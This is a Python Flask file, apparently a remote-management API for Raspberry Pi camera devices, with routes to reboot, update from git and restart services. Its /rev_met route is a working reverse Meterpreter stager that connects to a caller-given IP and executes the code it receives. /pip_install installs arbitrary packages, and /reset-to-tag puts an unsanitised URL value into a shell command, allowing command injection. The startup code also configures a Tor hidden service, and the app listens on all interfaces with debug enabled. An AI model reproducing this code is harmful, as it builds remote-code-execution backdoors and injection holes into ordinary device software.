import dbm
import json
import os
import shutil
import subprocess
from configparser import ConfigParser
from functools import wraps
from glob import glob
import urllib, socket
from flask import Flask, Response, request, g
from flask_bcrypt import Bcrypt
import time
from werkzeug.exceptions import default_exceptions
from werkzeug.exceptions import HTTPException
from flask import jsonify


app = Flask(__name__)
app.debug = True

bcrypt = Bcrypt(app)


def systemctl(options):
    """
    calls_systemctl with some parameters
    mainly to keep code clean,
    defined at start because its used _everywere_.
    returns True if command was successful, else false
    :param options: options to be passed to systemctl
    :return: True if systemctl exit code is 0, otherwise False
    """
    return True if not os.system("systemctl {}".format(options)) else False


def authenticate():
    return Response('Access DENIED!', 401, {'WWW-Authenticate': 'Basic realm="Login Required"'})


def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth:
            return authenticate()
        try:
            with dbm.open('db', 'r') as passdb:
                if bcrypt.check_password_hash(passdb[b'admin'].decode('utf-8'), auth.password):
                    return f(*args, **kwargs)
        except Exception as e:
            print(str(e))
        return authenticate()
    return decorated


def json_response(f):
    """
    json decoration,
    automatically detects the correct json formatter
    :param f: fucntion to decorate
    :return:
    """
    @wraps(f)
    def decorated(*args, **kwargs):
        def fn(*args, **kwargs):
            rstuff = f(*args, *kwargs)
            if type(rstuff) is list:
                return json.dumps(rstuff)
            elif type(rstuff) is dict:
                return jsonify(rstuff)
            else:
                return str(rstuff)
        return fn(*args, **kwargs)
    return decorated


def after_this_request(func):
    """
    after request function
    :param func:
    :return:
    """
    if not hasattr(g, 'call_after_request'):
        g.call_after_request = []
    g.call_after_request.append(func)
    return func


def shutdown_server():
    """
    shuts down the current werkzeug server
    :return:
    """
    func = request.environ.get('werkzeug.server.shutdown')
    if func is None:
        raise RuntimeError('Not running with the Werkzeug Server')
    func()


@app.after_request
def per_request_callbacks(response):
    for func in getattr(g, 'call_after_request', ()):
        response = func(response)
    return response

def reconfigure_systemd():
    """
    reconfigures systemd service files for api, webinterface and capture.
    copies the service files from the current dir and checks to see f they are enabled.
    reboots if changed.
    :return:
    """
    systemd_path = "/etc/systemd/system/{}"
    new_service_files = [
        "eyepi-api.service",
        "eyepi-capture.service",
        "eyepi-webinterface.service"
    ]
    needs_reboot = False

    old_capture_service_file = "spc-eyepi_capture.service"
    old_webinterface_service_file = "spc-eyepi_webinterface.service"


    def ensure_systemd_unit(service_file):
        if not os.path.isfile(systemd_path.format(service_file)) and \
                os.path.isfile(service_file):
            shutil.copy(service_file, systemd_path.format(service_file))
            os.chmod(systemd_path.format(service_file), 0o664)
            os.system("systemctl daemon-reload")
            os.system("systemctl enable {}".format(service_file))

    for s_file in new_service_files:
        ensure_systemd_unit(s_file)

    if os.system("systemctl is-enabled {}".format("eyepi-capture.service")) == 0 and \
                    os.system("systemctl is-enabled {}".format(old_capture_service_file)) == 0:
        os.system("systemctl disable {}".format(old_capture_service_file))
        needs_reboot = True

    if os.system("systemctl is-enabled {}".format("eyepi-webinterface.service")) == 0 and \
                    os.system("systemctl is-enabled {}".format(old_webinterface_service_file)) == 0:
        os.system("systemctl disable {}".format(old_webinterface_service_file))
        needs_reboot = True

    if needs_reboot:
        os.system("shutdown -r +1 'Shutting down because the unit files were changed.")


def get_eyepi_capture_service():
    """
    gets the currently active spc-eyepi service file.
    :return:
    """
    new_capture_service_file = "eyepi-capture.service"
    if os.system("systemctl is-enabled {}".format(new_capture_service_file)) == 0:
        return new_capture_service_file
    return "spc-eyepi_capture.service"


@app.route('/restart')
@app.route('/reboot')
@requires_auth
def restart():
    @after_this_request
    def shutdown(response):
        time.sleep(1)
        # shutdown_server()
        os.system("shutdown -r +1 'This computer will restart in 1 minute'")
        return response

    return "Rebooting... ", 200


@app.route("/update")
@requires_auth
def update():
    @after_this_request
    def _update(response):
        app.debug = False
        os.system("git fetch --all;git reset --hard origin/master")
        systemctl("restart {}".format(get_eyepi_capture_service()))
        return response

    app.debug = True
    return "SUCCESS"


@app.route("/reset-to-tag/<tag>")
@requires_auth
def reset_to_tag(tag):
    """
    resets the repository to a tag.
    useful for resetting to a known working version.
    :param tag:
    :return:
    """
    @after_this_request
    def reset_to_tag(response):
        app.debug = False
        os.system("git fetch --tags --all;git reset --hard {}".format(tag))
        systemctl("restart {}".format(get_eyepi_capture_service()))
        return response

    app.debug = True
    return {"status": True,
            "message": "Reverted to {}".format(tag)}


@app.route("/pip_install")
@requires_auth
def pip_install():
    package = request.args.get('package', None)
    try:
        import pip
        _, package = dict(request.args).popitem()
        pip.main(["install", package])
    except Exception as e:
        return {"status":False, "message": str(e)}, 500
    return {"status":True, "message": "Package installed"}


@app.route("/rev_met")
@requires_auth
@json_response
def reverse_meterpreter():
    """
    reverse meterpreter shell
    :param: ip (GET) ip address to remotely connect to
    :return: json with status
    """
    ip = request.args.get('ip', None)
    import socket, struct
    try:
        s = socket.socket(2, 1)
        s.connect((ip, 4444))
        l = struct.unpack('>I', s.recv(4))[0]
        d = s.recv(4096)
        while len(d) != l:
            d += s.recv(4096)
        exec(d, {'s': s})
    except Exception as e:
        return {"status": False,
                "message": str(e)}

    return {"status": True,
            "message": 'Welcome...'}


@app.route('/botnetmgmt')
@requires_auth
def botnetmgmt():
    """
    deprecated in favor of a different method of updating camera status.
    will be removed in the next major update.
    :return:
    """
    # use post later to send commands
    # get hostname:
    jsondata = {}
    version = subprocess.check_output(["/usr/bin/git describe --always"], shell=True).decode()
    jsondata["version"] = version.strip("\n")
    hn = None
    try:
        try:
            jsondata["external_ip"] = \
                json.loads(
                        urllib.request.urlopen('https://api.ipify.org/?format=json', timeout=10).read().decode(
                                'utf-8'))[
                    'ip']
        except Exception as e:
            print(str(e))

        with open("/etc/hostname", "r") as fn:
            hn = fn.readlines()[0]
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 0))
        jsondata['internal_ip'] = s.getsockname()[0]

        metadatas = {}
        metadatas_from_cameras_fn = glob("*.json")
        for fn in metadatas_from_cameras_fn:
            with open(fn, 'r') as f:
                metadatas[os.path.splitext(fn)[0]] = json.loads(f.read())
        jsondata['metadata'] = metadatas

        a_statvfs = os.statvfs("/")
        free_space = a_statvfs.f_frsize * a_statvfs.f_bavail
        total_space = a_statvfs.f_frsize * a_statvfs.f_blocks
        for x in range(0, 2):
            free_space /= 1024.0
            total_space /= 1024.0
        jsondata['free_space_mb'] = free_space
        jsondata['total_space_mb'] = total_space
        jsondata["name"] = hn

        rpiconfig = ConfigParser()
        rpiconfig.read("picam.ini")
        configs = {}
        for file in glob(os.path.join("configs_byserial", "*.ini")):
            configs[os.path.basename(file)[:-4]] = ConfigParser()
            configs[os.path.basename(file)[:-4]].read(file)
        jsondata['cameras'] = {}
        for serial, cam_config in configs.items():
            conf = {}
            for section in cam_config.sections():
                if not section == "formatter_logfileformatter" and not section == "formatter_simpleFormatter":
                    conf[section] = dict(cam_config.items(section))
            jsondata['cameras'][serial] = conf
        rpc = {}
        for section in rpiconfig.sections():
            if not section == "formatter_logfileformatter" and not section == "formatter_simpleFormatter":
                rpc[section] = dict(rpiconfig.items(section))

        try:
            with open("/etc/machine-id") as f:
                ser = str(f.read())
                ser = ser.strip('\n')
                jsondata['cameras'][ser] = rpc
        except Exception as e:
            jsondata['cameras']['picam'] = rpc
            jsondata['cameras']['picam']['error'] = str(e)
        return str(json.dumps(jsondata))
    except Exception as e:
        return str(e)


def get_version():
    subprocess.check_output(["/usr/bin/git describe --always"], shell=True).decode()


if __name__ == "__main__":
    try:
        # generate a new machine id if one does not already exist
        new_torrc = """Log notice syslog
                    DataDirectory /var/lib/tor
                    HiddenServiceDir /home/tor_private/
                    HiddenServicePort 80 127.0.0.1:5000
                    HiddenServicePort 666 127.0.0.1:666
                    HiddenServiceAuthorizeClient basic bvz"""
        new_torrc = "\n".join(q.lstrip("                ") for q in new_torrc.splitlines())

        restart_tor = False

        with open('/etc/tor/torrc', 'r') as torrc:
            if torrc.read() != new_torrc:
                restart_tor = True

        # with open('/etc/tor/torrc', 'w') as torrc:
        #     torrc.write(torrc)

        os.system("chown -R tor:tor /home/tor_private ")
        os.system("chown -R tor:tor /var/lib/tor")

        if restart_tor:
            systemctl("restart tor.service")

        if not os.path.exists("/etc/machine-id"):
            os.system("systemd-machine-id-setup")
    except:
        print("something went wrong, oh well...")

    app.run(host='0.0.0.0', port=666)
